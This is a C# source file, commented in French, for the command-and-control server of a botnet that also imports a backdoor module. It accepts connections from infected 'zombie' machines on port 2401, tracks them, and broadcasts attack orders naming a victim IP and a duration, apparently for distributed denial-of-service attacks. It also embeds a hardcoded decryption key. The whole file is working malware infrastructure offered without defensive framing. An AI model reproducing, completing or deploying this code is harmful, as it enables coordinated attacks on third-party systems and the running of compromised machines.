using System ;
using System.Net;
using System.Net.Sockets ;
using System.Collections ;
using System.Collections.Generic ;
using System.Timers;
using System.Threading ;
using System.Text;

using BotnetAPP.Shared ;
using LegitimeAPP.Backdoor;


/*
CODE :

1 : Requête de connexion 

*/

namespace BotnetAPP.Network {
    public class Connection {

        private readonly int _listenPort = 2401 ; 
        private readonly string _decryptionCode = "pCw0bX$7OLQEI1!o^y%nc3^#";
        public Boolean AttackInProgress ; 
        private Dictionary<Zombie, Socket> _connectedBot ;

        // Timer 
        public System.Timers.Timer TimerAttack ; 

        // Event
        public event EventConnectionHandler NewConnectedBot;
        public event EventConnectionHandler NewDisconnectionBot ;

        public event EventConnectionHandler UpdateAction ; 
        public event EventConnectionHandler NewAttack ;
        public event EventConnectionHandler EndAttack ;



        // Thread
        private Thread _checkingConnectionRequest ;
        private Thread _checkingBotDisconnection ;
        private Thread _checkingChangeBotAction ; 
        private Thread _timerThread ; 

        private ASCIIEncoding _asen = new ASCIIEncoding();


        public Dictionary<Zombie, Socket> GetConnectedBot {
            get {
                return _connectedBot ; 
            }
        }

    // méthode permettant de déclencher les événements 
    public void OnNewConnectedBot(Zombie zombie) => NewConnectedBot?.Invoke(zombie);
    public void OnDisconnectionBot(Zombie zombie) => NewDisconnectionBot?.Invoke(zombie);

    public void OnUpdateAction(Zombie zombie) {
        UpdateAction?.Invoke(zombie) ;
    }  
    public void OnNewAttack(Zombie zombie) => NewAttack?.Invoke(zombie) ;
    public void OnEndAttack(Zombie zombie) => EndAttack?.Invoke(zombie) ;

    public Connection() {

        // Initialisation de la liste contenant les utilisateurs connectés 
        _connectedBot = new() ;
        TimerAttack = new() ; 


        AttackInProgress = false ;

        // Initialisation des threads et démarrage

        _checkingConnectionRequest = new Thread(ListenConnectionRequest) ;
        _checkingBotDisconnection = new Thread(CheckBotsDisconnections) ;
        _checkingChangeBotAction = new Thread(UpdateBotAction) ;


        _checkingConnectionRequest.Name = "Checking connection request" ;
        _checkingBotDisconnection.Name = "Checking Bot Disconnection" ; 
        _checkingChangeBotAction.Name = "Checking Change Action Bot " ; 

        _checkingConnectionRequest.Start() ;
        _checkingBotDisconnection.Start() ;
        _checkingChangeBotAction.Start() ; 

    }


    /*

    Lance le timer 

    */

    private void SetTimer(int second) {
        TimerAttack = new System.Timers.Timer() ;
        
        TimerAttack.Interval = second*1000;
        TimerAttack.Enabled = true ;
        TimerAttack.AutoReset = false ;

        TimerAttack.Elapsed += AtEndAttack;



    }


        private void AtEndAttack(Object source, ElapsedEventArgs e)
    {

        OnEndAttack(new Zombie()) ; 
        AttackInProgress = false ;

        Console.WriteLine("L'attaque est fini ") ; 
    }



/*
    Ecriture et lecture des messages  envoyés et reçu par l'un des clients

    */
    
    private string GetIncomingMessage(Socket s) {
              byte[] rawMessage = new byte[1024];
              string resultat  = "";
              int k = s.Receive(rawMessage);
               for (int i = 0; i < k; i++) {
                resultat += Convert.ToChar(rawMessage[i]);
               }
                return resultat ; 
        }
    
    // A écrire pour simplifier le processus de communication
    private void WriteNetMessage (string message, Socket s) => s.Send(_asen.GetBytes(message)) ;


    // Envoie un message a tout les bots connectés 
    private void BroadcastNetMessage (string message) {
        foreach (KeyValuePair<Zombie, Socket> item in _connectedBot) {
            WriteNetMessage( message,item.Value) ; 
        }
    }
        
    


    public void GiveOrder(Order order) {

        Console.WriteLine($"L'attaque contre {order.VictimIP} pendant {order.nbSecond}") ; 
        SetTimer(order.nbSecond) ; 
        BroadcastNetMessage(Data<Order>.DataToXml(order)) ;

        AttackInProgress = true ; 
    }
 
    
        
    private bool SocketConnected(Socket s) => !((s.Poll(1000, SelectMode.SelectRead) && (s.Available == 0)) || !s.Connected);


    public void UpdateBotAction() {
        while ( true ) {

            try {
                lock (_connectedBot) {

                    Dictionary<KeyValuePair<Zombie, Socket>, TypeAction> MiseAJourZombie = new() ;             

                    foreach ( KeyValuePair<Zombie, Socket> item in _connectedBot ) {
                        string message = GetIncomingMessage(item.Value) ;
                        MiseAJourZombie[item] = Data<Order>.XmlToData(message).action ; 
                        Console.WriteLine("On passe par là "+message) ; 
                    }

                    foreach ( KeyValuePair<KeyValuePair<Zombie, Socket>, TypeAction> item in MiseAJourZombie  ) {
                    
                    // On supprime pour le mettre a jour
                    _connectedBot.Remove(item.Key.Key) ;

                    item.Key.Key.SetAction(item.Value) ; 

                    _connectedBot[item.Key.Key] = item.Key.Value ;

                    }

                    OnUpdateAction(new Zombie()) ; 
                }
            }
            catch (Exception ex) {
            Console.WriteLine(" c'est ici") ; 
             Console.WriteLine(ex.Message) ; 
            }

             // Une seconde avant chaque vérification 
         Thread.Sleep(1000);  
        }
    }



    public void CheckBotsDisconnections() {

        while (true) {

            List<Zombie> ZombieLost = new() ; 


            foreach (KeyValuePair<Zombie, Socket> item in _connectedBot) {
                if ( !SocketConnected(item.Value) ) {
                    Console.WriteLine($" {item.Value.RemoteEndPoint} s'est déconnecté") ; 
                    ZombieLost.Add(item.Key) ;                
                }
            }

            lock (_connectedBot) {
                foreach ( Zombie zb in ZombieLost) {
                lock (_connectedBot) {

                _connectedBot.Remove(zb) ;
                OnDisconnectionBot(zb) ;

                    }  
                }
            }
            
            // Une seconde avant chaque vérification 
         Thread.Sleep(1000);   
        }
    }

        /*
        Ecoute les demandes de connexions 
        */
    public void ListenConnectionRequest() {
        
                IPAddress ipAd = IPAddress.Any;

                TcpListener listen = new TcpListener(ipAd, _listenPort);

                while(true) {
                    
                listen.Start();

                Console.WriteLine("Le serveur à démarrer sur le port " + _listenPort.ToString());
                Console.WriteLine("L'adresse ip du serveur  :" + listen.LocalEndpoint);
                Console.WriteLine("On attend la connexion.....");

                Socket s = listen.AcceptSocket();

                try {
                    Console.WriteLine("Connexion ouverte " + s.RemoteEndPoint);



                    /* 
                    Pour l'instant je laisse comme ça
                    Plus tard je mettrais un vrai système de contrôle de connexion
                    */ 
                    if ( GetIncomingMessage(s) == "1" ) {
                        Zombie nvZb = new(s.RemoteEndPoint.ToString()) ; 
                        _connectedBot.Add(nvZb, s) ;
                        OnNewConnectedBot(nvZb) ; 
                    }


                    Console.WriteLine($"Nombre de bot connecté : {_connectedBot.Count}") ; 



                    
                } catch (Exception ex) {
                    // DEBUGGING 

                    Console.WriteLine("[EXCEPTION] : " + ex.StackTrace) ; 
                }
        }
    }
  }
}